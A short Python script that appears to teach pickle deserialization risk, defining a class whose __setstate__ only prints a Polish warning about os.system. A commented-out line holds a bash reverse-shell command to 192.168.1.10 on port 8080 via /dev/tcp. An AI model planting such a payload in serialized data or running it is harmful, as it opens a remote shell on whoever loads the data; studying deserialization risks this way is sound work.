import pickle

# os.system('/bin/bash -c
#           "/bin/bash -i >& /dev/tcp/192.168.1.10/8080 0>&1"')


class foobar:

    def __init__(self):
        pass

    def __getstate__(self):
        return self.__dict__

    def __setstate__(self, state):
        print("tu moga byc tarapaty jak os.system ....")

    def __repr__(self):
        cls = self.__class__.__name__
        return f"{cls}()"


my_foobar = foobar()

my_pickel = pickle.dumps(my_foobar)

my_unpickle = pickle.loads(my_pickel)

print(type(my_unpickle))
print(my_unpickle)